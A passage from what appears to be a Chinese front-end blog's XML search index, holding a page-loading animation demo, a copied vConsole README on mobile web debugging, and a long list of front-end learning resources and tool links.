span&#123;display:block;height:2px;width:0;background-color:green&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="preloader"&gt;&lt;div id="preloader_center"&gt;&lt;span id="preloader_btn"&gt;Loading...&lt;/span&gt;&lt;span id="preloader_line"&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;div id="preloader_loading"&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;iframe src="http://jd.com"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;查看演示]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>原生JS首页进度加载动画</tag>
        <tag>首页进度加载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动前端console调试面板（移动网页端调试工具）—vConsole]]></title>
    <url>%2F2016%2F08%2F20%2F%E7%A7%BB%E5%8A%A8%E5%89%8D%E7%AB%AFconsole%E8%B0%83%E8%AF%95%E9%9D%A2%E6%9D%BF%EF%BC%88%E7%A7%BB%E5%8A%A8%E7%BD%91%E9%A1%B5%E7%AB%AF%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%EF%BC%89-vconsole%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;一个针对手机网页的前端console调试面板，并将其开源了，一个非常有用的开发调试工具。项目地址： https://github.com/WechatFE/vConsole 。不多介绍，以下内容直接 copy 了项目的 README.md简介vConsole 是一个网页前端调试面板，专为手机 web 页面量身设计，帮助开发者更为便捷地进行开发调试工作。效果预览预览二维码使用方法1.下载模块checkout 文件 dist/vconsole.min.js 到本地。2.引入模块(1) 如果未使用 AMD/CMD 规范，可直接在 HTML 中引入 vConsole 模块：1&lt;script src="path/to/vconsole.min.js"&gt;&lt;/script&gt;(2) 如果使用了 AMD/CMD 规范，可在 module 内使用 require() 引入模块：1var vConsole = require('path/to/vconsole.min.js');3.打印 log 日志(1) 与 PC 端打印 log 一致，可直接使用 console.log() 等方法直接打印日志：1console.log('Hello World');未加载 vConsole 模块时， console.log() 会直接打印到原生控制台中；加载 vConsole 后，日志会打印到页面前端+原生控制台。(2) 支持 4 种不同类型的日志，会以不同的颜色输出到前端面板：12345console.log('foo'); // 白底黑字console.info('bar'); // 白底紫字console.debug('oh'); // 白底黄字console.warn('foo'); // 黄底黄字console.error('bar'); // 红底红字(3) 支持打印 Object 对象，会以 JSON 字符串格式输出：123var obj = &#123;&#125;;obj.foo = 'bar';console.log(obj); // 打印出 &#123;foo: 'bar'&#125;(4) 支持传入多个参数，会以空格隔开：12var uid = 233;console.log('UserID:', uid); // 打印出 UserID: 233(5) 引入模块后，vConsole 会有一段很小的延迟来用于初始化工作。此时若需打印日志，请使用 vConsole.ready() 方法：12345// 若未通过 AMD/CMD 方式加载模块，// vConsole 会自动挂载在全局 window 对象中，即 window.vConsolevConsole.ready(function() &#123;console.log('Hello World');&#125;);注意事项&emsp;&emsp;引入 vConsole 模块后，页面前端将会在右下角出现 vConsole 的悬停按钮，可展开/收起面板。&emsp;&emsp;若不希望普通用户看到面板，请不要在生产环境中引入 vConsole 模块。动态引入模块的方法可参考 example/demo2.php 示例。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>vConsole</tag>
        <tag>移动前端console调试面板</tag>
        <tag>移动网页端调试工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端开发资源汇集]]></title>
    <url>%2F2016%2F08%2F19%2F%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E8%B5%84%E6%BA%90%E6%B1%87%E9%9B%86%2F</url>
    <content type="text"><![CDATA[综合类前端知识体系 http://www.cnblogs.com/sb19871023/p/3894452.html前端知识结构 https://github.com/JacksonTian/fksWeb前端开发大系概览 https://github.com/unruledboy/WebFrontEndStackWeb前端开发大系概览-中文版 http://www.cnblogs.com/unruledboy/p/WebFrontEndStack.htmlWeb Front-end Stack v2.2 Web Front-end Stack v2.2免费的编程中文书籍索引 https://github.com/justjavac/free-programming-books-zh_CN前端书籍 https://github.com/dypsilon/frontend-dev-bookmarks前端免费书籍大全 https://github.com/vhf/free-programming-books前端知识体系 http://www.cnblogs.com/sb19871023/p/3894452.html免费的编程中文书籍索引 https://github.com/justjavac/free-programming-books-zh_CN智能社 - 精通JavaScript开发 http://study.163.com/course/introduction/224014.htm重新介绍 JavaScript（JS 教程） https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript麻省理工学院公开课：计算机科学及编程导论 http://v.163.com/special/opencourse/bianchengdaolun.htmlJavaScript中的this陷阱的最全收集–没有之一 http://segmentfault.com/a/1190000002640298JS函数式编程指南 https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/ch1.htmlJavaScript Promise迷你书（中文版） http://liubin.github.io/promises-book腾讯移动Web前端知识库 https://github.com/AlloyTeam/MarsFront-End-Develop-Guide 前端开发指南 https://github.com/Front-End-Developers-Hunan/Front-End-Develop-Guide前端开发笔记本 https://li-xinyang.gitbooks.io/frontend-notebook/content大前端工具集 - 聂微东 https://github.com/nieweidong/fetool前端开发者手册 https://dwqs.gitbooks.io/frontenddevhandbook/content入门类前端入门教程 http://www.cnblogs.com/jikey/p/3613082.html瘳雪峰的Javascript教程 http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000jQuery基础教程 http://www.imooc.com/view/11前端工程师必备的PS技能——切图篇 http://www.imooc.com/view/506结合个人经历总结的前端入门方法 https://github.com/qiu-deqing/FE-learning工具类前端人的俱乐部 http://f2er.club/如何优雅地使用Sublime Text http://www.jeffjade.com/2015/12/15/2015-04-17-toss-sublime-text/#新编码神器Atom使用纪要 http://www.jeffjade.com/2016/03/03/2016-03-02-how-to-use-atom/css sprite 雪碧图制作 http://www.imooc.com/learn/93版本控制入门 – 搬进 Github http://www.imooc.com/learn/390Grunt-beginner前端自动化工具 http://www.imooc.com/learn/30IntelliJ IDEA 简体中文专题教程 https://github.com/judasn/IntelliJ-IDEA-TutorialWebstorm,InterllIdea,Phpstorm http://t.cn/8kZZ1UySublimeText https://github.com/jikeytang/sublime-textAtom https://atom.iovisual studio code https://code.visualstudio.com综合效果搜索平台zoommyapp.com http://zoommyapp.com/ 高质量图库unsplash.com https://unsplash.com/ 高质量图库www.pinterest.com https://www.pinterest.com/ 图库New Old Stock http://nos.twnsnd.co 复古风图库效果网 http://www.jq22.com花瓣网 http://huaban.com/优美图 http://www.topit.me/codepen http://codepen.io/17素材 http://www.17sucai.com摄图网 http://699pic.com/常用的JavaScript代码片段 http://microjs.com周报类奇舞周刊 http://old.75team.com/weekly/码农周刊 http://weekly.manong.ioJS前端开发群月报 http://www.kancloud.cn/jsfront/month/82796WEB前端开发 http://www.css88.comA JS tip per day! http://www.jstips.co平安科技移动开发二队技术周报 https://github.com/PaicHyperionDev/MobileDevWeekly开发中心mozilla js参考 https://developer.mozilla.org/zh-CN/docs/Web/JavaScriptchrome开发中心（chrome的内核已转向blink） https://developer.chrome.com/extensions/api_index.htmlsafari开发中心 https://developer.apple.com/library/safari/navigationmicrosoft js参考 https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94.aspxjs秘密花园 http://sanshi.me/articles/JavaScript-Garden-CN/html/index.htmljs秘密花园 http://bonsaiden.github.io/JavaScript-Garden/zhw3help http://www.w3help.orgNodejsnodejs 篇幅比较巨大 http://liuqing.pwNode.js 包教不包会 https://github.com/alsotang/node-lessons篇幅比较少 http://www.rainweb.cn/article/category/Nodejsnode express 入门教程 http://www.w3cfuns.com/article-5598538-1-1.htmlnodejs定时任务 http://my.oschina.net/u/568264/blog/193773一个nodejs博客 http://60sky.com【NodeJS 学习笔记04】新闻发布系统 http://www.cnblogs.com/yexiaochai/p/3536547.html过年7天乐，学nodejs 也快乐 http://www.cnblogs.com/qqloving/p/3541099.html七天学会NodeJS https://github.com/nqdeng/7-days-nodejsNodejs学习笔记（二）— 事件模块 http://www.cnblogs.com/zhongweiv/p/nodejs_events.htmlnodejs入门 http://www.cnblogs.com/liusuqi/p/3735491.htmlangularjs nodejs https://github.com/zensh/jsgen从零开始nodejs系列文章 http://blog.fens.me/series-nodejs理解nodejs http://debuggable.com/posts/understanding-node-js:4bd98440-45e4-4a9a-8ef7-0f7ecbdd56cbnodejs事件轮询 http://blog.mixu.net/2011/02/01/understanding-the-node-js-event-loopnode入门 http://www.nodebeginner.org/index-zh-cn.htmlnodejs cms http://ourjs.com/detail/53e1f281c5910a9806000001Node初学者入门，一本全面的NodeJS教程 http://ourjs.com/detail/529ca5950cb6498814000005NodeJS的代码调试和性能调优 http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line综合APIjavascripting http://www.javascripting.com各种流行库搜索 http://microjs.comrunoob.com-包含各种API集合 http://www.runoob.com开源中国在线API文档合集 http://tool.oschina.net/apidocsdevdocs http://devdocs.ioEcmascriptEcmascript 地址Understanding ECMAScript 6 - Nicholas C. Zakas https://leanpub.com/understandinges6/readexploring-es6 https://leanpub.com/exploring-es6/readexploring-es6翻译 https://github.com/es6-org/exploring-es6exploring-es6翻译后预览 http://es6-org.github.io/exploring-es6阮一峰 es6 http://es6.ruanyifeng.com阮一峰 Javascript http://javascript.ruanyifeng.comECMA-262，第 5 版 http://yanhaijing.com/es5es5 http://es5.github.ioJs templatetemplate-chooser http://garann.github.io/template-chooserartTemplate https://github.com/aui/artTemplatetomdjs https://github.com/aui/tmodjs/blob/master/README.md淘宝模板juicer模板 http://juicer.name/docs/docs_zh_cn.htmlFxtpl v1.0 繁星前端模板引擎 http://koen301.github.io/fxtpllaytpl http://laytpl.layui.commozilla - nunjucks https://github.com/mozilla/nunjucksJuicer https://github.com/PaulGuo/Juicerdustjs http://akdubya.github.io/dustjsetpl http://ecomfe.github.io/etplCSSCSS 语法参考 http://tympanus.net/codrops/css_referenceCSS3动画手册 http://isux.tencent.com/css3/index.html腾讯css3动画制作工具 http://isux.tencent.com/css3/tools.html志爷css小工具集合 http://linxz.github.io/tianyizonecss3 js 移动大杂烩 http://www.note12.com/category/blog/2014-6-5/538fe0a9f786f1b7019a4dfbbouncejs 触摸库 http://bouncejs.comcss3 按钮动画 http://fian.my.id/Wavesanimate.css http://daneden.github.io/animate.css全局CSS的终结(狗带 [译] http://www.alloyteam.com/2015/10/8536browserhacks http://browserhacks.comAngularjsAngular.js 的一些学习资源 https://github.com/dolymood/AngularLearningangularjs中文社区 http://angularjs.cnAngularjs源码学习 http://www.cnblogs.com/xuwenmin888/p/3739096.htmlAngularjs源码学习 http://www.ifeenan.com/?c=AngularJSangular对bootstrap的封装 http://angular-ui.github.io/bootstrapangularjs + nodejs https://cnodejs.org/topic/51404e0f069911196d2e3923吕大豹 Angularjs http://www.cnblogs.com/lvdabao/tag/AngularJsAngularJS 最佳实践 http://www.infoq.com/cn/news/2013/02/angular-web-appAngular的一些扩展指令 http://www.lovelucy.info/angularjs-best-practices.htmlAngular数据绑定原理 https://github.com/Pasvaz/bindonce一些扩展Angular UI组件 https://github.com/angular-uiEmber和AngularJS的性能测试 http://voidcanvas.com/emberjs-vs-angularjs-performance-testing带你走近AngularJS - 基本功能介绍 http://www.cnblogs.com/powertoolsteam/p/angularjs-introdection.htmlAngularjs开发指南 http://angular.duapp.com/docs/guideAngularjs学习 http://www.cnblogs.com/amosli/p/3710648.html不要带着jQuery的思维去学习AngularJS http://www.rainweb.cn/article/angularjs-jquery.htmlangularjs 学习笔记 http://wangjiatao.diandian.com/?tag=angularjsangularjs 开发指南 http://www.angularjs.cn/T008angularjs 英文资料 https://github.com/jmcunningham/AngularJS-Learningangular bootstrap http://angular-ui.github.io/bootstrapangular jq mobile https://github.com/opitzconsulting/jquery-mobile-angular-adapterangular ui http://mgcrea.github.io/angular-strap整合jQuery Mobile+AngularJS经验谈 http://www.tuicool.com/articles/7ZZVr2有jQuery背景，该如何用AngularJS编程思想 http://blog.jobbole.com/46589/AngularJS在线教程 http://each.sinaapp.com/angularangular学习笔记 http://www.zouyesheng.com/angular.htmlReactreact.js 中文论坛 http://www.react-china.orgreact.js 官方网址 https://facebook.github.io/react/index.htmlreact.js 官方文档 https://facebook.github.io/react/docs/getting-started.htmlreact.js material UI http://material-ui.com/#react.js TouchstoneJS UI http://touchstonejs.ioreact.js amazeui UI http://amazeui.org/reactReact 入门实例教程 - 阮一峰 http://www.ruanyifeng.com/blog/2015/03/react.htmlReact Native 中文版 http://wiki.jikexueyuan.com/project/react-nativeWebpack 和 React 小书 - 前端乱炖 http://www.html-js.com/article/Fakefish%203053Webpack 和 React 小书 - gitbook https://fakefish.github.io/react-webpack-cookbookwebpack https://github.com/webpack/webpackWebpack，101入门体验 http://html-js.com/article/3009webpack入门教程 http://html-js.com/article/3113基于webpack搭建前端工程解决方案探索 http://segmentfault.com/a/1190000003499526React原创实战视频教程 http://www.piliyu.comvueVue http://cn.vuejs.orgVue 论坛 http://forum.vuejs.orgVue 入门指南 http://www.cnblogs.com/aaronjs/p/3660102.htmlVue 的一些资源索引 http://segmentfault.com/a/1190000000411057awesome-vue https://github.com/vuejs/awesome-vue移动端API99移动端知识集合 https://github.com/jtyjty99999/mobileTech移动端前端开发知识库 https://github.com/AlloyTeam/Mars移动前端的一些坑和解决方法（外观表现） http://caibaojian.com/mobile-web-bug.html【原】移动web资源整理 http://www.cnblogs.com/PeunZhang/p/3407453.htmlzepto 1.0 中文手册 http://mweb.baidu.com/zeptoapizepto 1.0 中文手册 http://www.html-5.cn/Manual/Zeptozepto 1.1.2 http://www.css88.com/doc/zeptojs_apizepto 中文注释 http://www.cnblogs.com/sky000/archive/2013/03/29/2988952.htmljqmobile 手册 http://app-framework-software.intel.com/api.php移动浏览器开发集合 https://github.com/maxzhang/maxzhang.github.com/issues移动开发大杂烩 https://github.com/hoosin/mobile-web-favoritesjQueryjQuery API 中文文档 http://www.jquery123.comhemin 在线版 http://hemin.cn/jqcss88 jq api http://www.css88.com/jqapi-1.9/oncss88 jqui api http://www.css88.com/jquery-ui-api学习jquery http://learn.jquery.comjquery 源码查找 http://james.padolsey.com/jqueryD3d3 Tutorials https://github.com/mbostock/d3/wiki/TutorialsGallery https://github.com/mbostock/d3/wiki/Gallerylofter http://datavisual.lofter.com/post/40cf3a_188e535iteye http://alanland.iteye.com/blog/1878595ruanyifeng http://javascript.ruanyifeng.com/library/d3.htmlRequriejsJavascript模块化编程（一）：模块的写法 http://www.ruanyifeng.com/blog/2012/10/javascript_module.htmlJavascript模块化编程（二）：AMD规范 http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.htmlJavascript模块化编程（三）：require.js的用法 http://www.ruanyifeng.com/blog/2012/11/require_js.htmlRequireJS入门（一） http://www.cnblogs.com/snandy/archive/2012/05/22/2513652.htmlRequireJS入门（二） http://www.cnblogs.com/snandy/archive/2012/05/23/2513712.htmlRequireJS进阶（三） http://www.cnblogs.com/snandy/archive/2012/06/08/2538001.htmlrequrie源码学习 http://www.cnblogs.com/yexiaochai/p/3632580.htmlrequrie 入门指南 http://www.oschina.net/translate/getting-started-with-the-requirejs-libraryrequrieJS 学习笔记 http://www.cnblogs.com/yexiaochai/p/3214926.htmlrequriejs 其一 http://cyj.me/why-seajs/requirejs/require backbone结合 http://www.cnblogs.com/yexiaochai/p/3221081.htmlSeajsseajs http://seajs.orgseajs 中文手册 http://cyj.me/why-seajs/zhLess,sasssass http://www.w3cplus.com/sassguidesass教程-sass中国 http://www.sass.hkSass 中文文档 http://sass.bootcss.comless [http://less.bootcss.com](http://less.bootcss.comMarkdownMarkdown 语法说明 (简体中文版 http://wowubuntu.com/markdownmarkdown入门参考 https://github.com/LearnShare/Learning-Markdown/blob/master/README.mdgitbook https://www.gitbook.com 国外的在线markdown可编辑成书mdeditor https://www.zybuluo.com/mdeditor 一款国内的在线markdown编辑器stackedit https://stackedit.io 国外的在线markdown编辑器，功能强大，同步云盘mditor http://bh-lay.github.io/mditor 一款轻量级的markdown编辑器lepture-editor https://github.com/lepture/editormarkdown-editor https://github.com/jbt/markdown-editor作业部落 https://www.zybuluo.com 功能强大，速度流畅，全平台同步兼容性esma 兼容列表 http://kangax.github.io/compat-table/es6W3C CSS验证服务 http://jigsaw.w3.org/css-validator/validator.html.zh-cncaniuse http://caniuse.com/#indexcsscreator http://csscreator.com/propertiesmicrosoft https://msdn.microsoft.com/zh-cn/library/cc351024(v=vs.85.aspx在线测兼容-移动端 http://www.responsinator.comemulators https://www.manymo.com/emulatorsUI相关bootcss http://v3.bootcss.comMetroUICSS http://www.w3cplus.com/MetroUICSSsemantic http://semantic-ui.comButtons http://alexwolfe.github.io/Buttonskitecss http://hiloki.github.io/kitecsspintuer http://www.pintuer.comamazeui http://amazeui.orgworldhello http://www.worldhello.net/gotgithub/index.htmllinuxtoy http://igit.linuxtoy.org/contents.htmlgitmagic http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/zh_cnrogerdudler http://rogerdudler.github.io/git-guide/index.zh.htmlgitref http://gitref.justjavac.combook http://git-scm.com/book/zhgogojimmy http://gogojimmy.net/2012/01/17/how-to-use-git-1-git-basic其它APIHTTP API 设计指南 http://segmentfault.com/bookmark/1230000002521721javascript流行库汇总 javascriptoo验证api http://niceue.com/validator/demo/index.phpunderscore 中文手册 http://www.css88.com/doc/underscoreunderscore源码分析 http://www.html-js.com/article/Underscorejs-source-code-analysis-of-underscorejs-source-code-analysis%203031underscore源码分析-亚里士朱德的博客 http://yalishizhude.github.io/tags/underscoreunderscrejs en api http://underscorejs.orglodash - underscore的代替品 https://lodash.comext4api http://extjs-doc-cn.github.io/ext4apibackbone 中文手册 http://www.csser.com/tools/backbone/backbone.js.htmlqwrap手册 http://dev.qwrap.com/resource/js/_docs/youa/#/qw/base/loadJs.htm缓动函数 http://easings.net/zh-cnsvg 中文参考 http://www.w3school.com.cn/svg/svg_reference.aspsvg mdn参考 https://developer.mozilla.org/en-US/docs/Web/SVGsvg 导出 canvas https://github.com/gabelerner/canvgsvg 导出 png https://github.com/exupero/saveSvgAsPngai-to-svg http://www.zamzar.com/convert/ai-to-svglocalStorage 库 https://github.com/machao/localStorage图表类Highcharts 中文API http://www.hcharts.cn/api/index.phpHighcharts 英文API http://api.highcharts.com/highchartsECharts 百度的图表软件 http://echarts.baidu.com/高德地图 http://lbs.amap.com/api开源的矢量图脚本框架 http://paperjs.orgsvg 地图 http://jvectormap.com正则JS正则表达式元字符 http://segmentfault.com/a/1190000002471140正则表达式30分钟入门教程 http://deerchao.net/tutorials/regex/regex.htmMDN-正则表达式 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressionsruanyifeng - RegExp对象 http://javascript.ruanyifeng.com/stdlib/regexp.html小胡子哥 - 进阶正则表达式 http://div.io/topic/764?page=1is.js https://github.com/Cedriking/is.js/blob/master/is.js正则在线测试 http://regexper.com前端通过分析github代码库总结出来的工程师代码书写习惯 http://alloyteam.github.io/CodeGuideHTML&amp;CSS编码规范 by @mdo http://codeguide.bootcss.com团队合作的css命名规范-腾讯AlloyTeam前端团队 http://www.alloyteam.com/2011/10/css-on-team-naming/前端编码规范之js - by yuwenhui http://yuwenhui.github.io前端编码规范之js - by 李靖 http://www.cnblogs.com/hustskyking/p/javascript-spec.html前端开发规范手册 http://zhibimo.com/read/Ashu/front-end-style-guideAirbnb JavaScript 编码规范（简体中文版） https://github.com/yuche/javascript#table-of-contentsAMD与CMD规范的区别 http://www.zhihu.com/question/20351507AMD与CMD规范的区别 http://www.cnblogs.com/tugenhua0707/p/3507957.htmlKISSY 源码规范 http://docs.kissyui.com/1.4/docs/html/tutorials/style-guide/kissy-source-style.htmlbt编码规范 http://codeguide.bootcss.com规范加强版 https://github.com/Suxiaogang/Code_Guide前端代码规范 及 最佳实践 http://blog.jobbole.com/79075百度前端规范 http://coderlmn.github.io/code-standards百度前端规范 http://isobar-idev.github.io/code-standards百度前端规范 http://zhuanlan.zhihu.com/fuyun/19884834ECMAScript6 编码规范–广发证券前端团队 https://github.com/gf-rd/es6-coding-styleJavaScript 风格指南/编码规范（Airbnb公司版） http://blog.jobbole.com/79484网易前端开发规范 http://nec.netease.com/standardcss模块 http://www.75team.com/archives/1049前端规范资源列表 https://github.com/ecomfe/specPHP最流行的PHP 代码规范 http://segmentfault.com/a/1190000000443795最流行的PHP 代码规范 https://github.com/hfcorriez/fig-standards/blob/zh_CN/%E6%8E%A5%E5%8F%97/PSR-2-coding-style-guide.md各大公司开源项目Facebook Projects https://code.facebook.com/projects/web百度web前端研发部 http://fex.baidu.com百度EFE http://efe.baidu.com百度github https://github.com/fex-teamalloyteam http://www.alloyteam.comalloyteam-github http://alloyteam.github.ioalloyteam-AlloyGameEngine https://github.com/AlloyTeam/AlloyGameEngineAlloyDesigner http://alloyteam.github.io/AlloyDesigner 即时修改，即时保存，设计稿较正，其它开发辅助工具H5交互页编辑器AEditor介绍 http://www.alloyteam.com/2015/06/h5-jiao-hu-ye-bian-ji-qi-aeditor-jie-shaoH5动画交互页开发的工具介绍AEditor http://aeditor.alloyteam.com H5动画交互页开发的工具maka http://forum.maka.im/wordpress值得订阅的weekly https://github.com/fenbility/weekly-feed腾讯html5 http://cube.qq.com奇舞团开源项目 http://75team.github.ioQunar UED http://ued.qunar.comScrat http://scrat.io常用ieBetter.js-让IE6-IE8拥有IE9+,Chrome等浏览器特性 http://www.zhangxinxu.com/wordpress/2013/12/iebetter-js-make-ie6-ie8-like-modern-browser-ie9-chrome模拟键盘 http://mottie.github.io/Keyboard拼音 https://github.com/hotoo/pinyin中国个人身份证号验证 https://github.com/mc-zone/IDValidator算法数据结构与算法 JavaScript 描述. 章节练习 https://github.com/Ralph-Wang/algorithm.in.js常见排序算法（JS版） https://github.com/twobin/twobinSort经典排序 https://github.com/luofei2011/jsAgm/blob/master/js/sort.js常见排序算法-js版本 https://github.com/hechangmin/jssortJavaScript 算法与数据结构 精华集 https://github.com/lightningtgc/JavaScript-Algorithms面试常考算法题精讲 http://www.nowcoder.com/live/courses移动端fastclick https://github.com/ftlabs/fastclickno-click-delay https://github.com/mmastrac/jquery-noclickdelay【敏捷开发】Android团队开发规范 http://www.cnblogs.com/lcw/p/3619181.htmlAndroid 开发规范与应用 http://www.jianshu.com/p/4390f4fe19b3ionic https://github.com/ychow/ionic-guideJSON模拟生成JSON数据 http://beta.json-generator.com返回跨域JSONAPI http://jsonp.afeld.me焦点图myfocus https://github.com/koen301/myfocusmyfocus-官方演示站 http://www.chhua.com/myfocusSuperSlidev2.1 – 大话主席 http://www.superslide2.comsoChange http://www.bujichong.com/sojs/soChange/index.htmlExt, EasyUI, J-UI 及其它各种UI方案extjs https://www.sencha.com/products/extjsext4英文api http://docs.sencha.com/extjs/4.0.7ext4中文api http://extjs-doc-cn.github.io/ext4apijquery easyui 未压缩源代码 http://jquery-easyui.googlecode.com/svn/trunk/srcJ-UI http://jui.orgMUI-最接近原生APP体验的高性能前端框架 http://dcloudio.github.io/muiAmaze UI 中国首个开源 HTML5 跨屏前端框架 http://amazeui.org淘宝 HTML5 前端框架 http://m.sui.taobao.orgKISSY - 阿里前端JavaScript库 http://docs.kissyui.com网易Nej - Nice Easy Javascript http://nej.netease.comKendo UI MVVM Demo http://demos.telerik.com/kendo-ui/mvvm/indexBootstrap http://www.bootcss.comSmart UI http://smartui.chinamzz.com雅虎UI - CSS UI http://developer.yahoo.com/yui/grids页面 社会化 分享功能百度分享 http://share.baidu.com pc端JiaThis http://jiathis.compc端社会化分享组件 http://developer.baidu.com/soc/share移动端ShareSDK 轻松实现社会化功能 http://www.mob.com/#/index移动端友盟分享 http://dev.umeng.com/social/android/quick-integration富文本编辑器功能齐全 tinymce https://www.tinymce.com百度 ueditor http://ueditor.baidu.com/website经典的ckeditor http://ckeditor.com经典的kindeditor http://kindeditor.netwysiwyg http://www.bootcss.com/p/bootstrap-wysiwyg一个有情怀的编辑器。Bach’s Editor http://integ.github.io/BachEditortower用的编辑器 https://github.com/mycolorway/simditorsummernote 编辑器 https://github.com/summernote/summernotehtml5编辑器 http://neilj.github.io/SquireXEditor http://lab.hustlzp.com/XEditorwangEditor https://github.com/wangfupeng1988/wangEditor前端概述前端工具大全 http://www.awesomes.cn什么是前端工程化 https://github.com/fouber/blog/issues/10?from=timeline&amp;isappinstalled=0#GulpGulp官网 http://gulpjs.comGulp中文网 http://www.gulpjs.com.cngulp资料收集 https://github.com/Platform-CUF/use-gulpGulp：任务自动管理工具 - ruanyifeng http://javascript.ruanyifeng.com/tool/gulp.htmlGulp插件 http://gulpjs.com/pluginsGulp探究折腾之路(I) http://www.jeffjade.com/2015/11/25/2015-11-25-toss-gulp/Gulp折腾之路(II) http://www.jeffjade.com/2016/01/19/2016-01-19-toss-gulp/Gulp不完全入门教程 http://www.ido321.com/1622.html为什么使用gulp? https://github.com/hjzheng/CUF_meeting_knowledge_share/issues/33Gulp安装及配合组件构建前端开发一体化 http://www.dbpoo.com/getting-started-with-gulpGulp 入门指南 https://github.com/nimojs/gulp-bookGulp 入门指南 - nimojs https://github.com/nimojs/blog/issues/19Gulp in Action http://www.imooc.com/video/5692Gulp开发教程（翻译） http://www.w3ctech.com/topic/134前端构建工具gulpjs的使用介绍及技巧 http://www.cnblogs.com/2050/p/4198792.htmlGruntgruntjs http://gruntjs.comGrunt中文网 http://www.gruntjs.netFisfis 官网 http://fex-team.github.io/fis-site/index.htmlfis http://fis.baidu.compc图轮单屏轮播sochange http://www.jsfoot.com/jquery/demo/2011-09-20/192.html左右按钮多图切换 http://bxslider.com/examples/carousel-demystifiedfullpage全屏轮播 https://github.com/alvarotrigo/fullPage.js移动端图轮无缝切换 http://www.swipejs.com滑屏效果 http://www.idangero.us/swiper全屏fullpage https://github.com/peunzhang/fullpage单个图片切换 https://github.com/qiqiboy/touchslider单个全屏切换 https://github.com/peunzhang/slip.js百度的切换库 http://touch.code.baidu.com/examples.html?qq-pf-to=pcqq.group单个全屏切换 https://github.com/peunzhang/iSlider滑屏效果 https://github.com/saw/touch-interfaces旋转拖动设置 http://baijs.com/tinycircleslider类似于swipe切换 http://touchslider.com支持多种形式的触摸滑动 http://www.swiper.com.cn/demo/index.html滑屏效果 https://github.com/joker-ye/main/blob/master/wap/index.html大话主席pc移动图片轮换 http://www.superslide2.com滑屏效果 https://github.com/hahnzhu/parallax.js基于zepto的fullpage https://github.com/yanhaijing/zepto.fullpage[WebApp]定宽网页设计下，固定宽度布局开发WebApp并实现多终端下WebApp布局自适应 http://www.cnblogs.com/plums/archive/2013/01/10/WebApp-fixed-width-layout-of-multi-terminal-adapter-since.html判断微信客户端的那些坑 http://loo2k.com/blog/detecting-wechat-client可以通过javascript直接调用原生分享的工具 https://github.com/JefferyWang/nativeShare.jsJiaThis 分享到微信代码 http://www.jiathis.com/help/html/weixin-share-code聊聊移动端跨平台开发的各种技术 http://fex.baidu.com/blog/2015/05/cross-mobile前端自动化测试 http://www.zhihu.com/question/29922082多种轮换图片 http://ajccom.github.io/niceslider滑动侧边栏 https://mango.github.io/slideout文件上传百度上传组件 http://fex.baidu.com/webuploader上传 https://blueimp.github.io/jQuery-File-Uploadflash 头像上传 http://www.hdfu.net图片上传预览 http://www.dropzonejs.com图片裁剪 http://elemefe.github.io/image-cropper图片裁剪-shearphoto http://www.shearphoto.comjQuery图片处理 http://www.oschina.net/project/tag/284/jquery-image-tools?lang=0&amp;os=0&amp;sort=view&amp;p=2模拟select糖饼 select http://aui.github.io/popupjs/doc/selectbox.htmlflexselect https://github.com/rmm5t/jquery-flexselect双select http://loudev.comselect2 http://select2.github.io取色插件类似 Photoshop 的界面取色插件 http://www.jq22.com/plugin/367jquery color https://github.com/jquery/jquery-color取色插件集合 http://www.oschina.net/project/tag/287/color-pickerfarbtastic 圆环＋正方形 https://github.com/mattfarina/farbtastic城市联动jquery.cityselect.js基于jQuery+JSON的省市或自定义联动效果 http://www.ijquery.cn/?p=360剪贴板剪贴板 https://github.com/zeroclipboard/zeroclipboardclipboard 最新的剪切方案 http://zenorocha.github.io/clipboard.js不是Flash的剪贴板 https://github.com/zenorocha/clipboard.js简繁转换简繁转换 https://github.com/BYVoid/OpenCC表格 Gridfacebook表格 http://facebook.github.io/fixed-data-table类似于Excel编辑表格-handsontable http://handsontable.combootstrap-table插件 http://bootstrap-table.wenzhixin.net.cndatatables https://www.datatables.net在线演示js 在线编辑 - runjs http://runjs.cnjs 在线编辑 - jsbin http://jsbin.comjs 在线编辑 - codepen http://codepen.iojs 在线编辑 - jsfiddle http://jsfiddle.netjava 在线编辑 - runjs http://ideone.comjs 在线编辑 - hcharts http://code.hcharts.cnjs 在线编辑 - jsdm http://jsdm.comsql 在线编辑 - sqlfiddle http://sqlfiddle.commozilla 在线编辑器 https://thimble.mozilla.org常规优化Javascript高性能动画与页面渲染 http://www.infoq.com/cn/articles/javascript-high-performance-animation-and-page-rendering移动H5前端性能优化指南 http://isux.tencent.com/h5-performance.html5173首页前端性能优化实践 http://ued.5173.com/?p=1731给网页设计师和前端开发者看的前端性能优化 http://www.uisdc.com/front-end-performance-for-web-designers-and-front-end-developers复杂应用的 CSS 性能分析和优化建议 http://www.orzpoint.com/profiling-css-and-optimization-notes张鑫旭——前端性能 张鑫旭——前端性能前端性能监控总结 http://www.xiaoqiang.org/javascript/font-end-performance-monitor.html网站性能优化之CSS无图片技术 网站性能优化之CSS无图片技术web前端性能优化进阶路 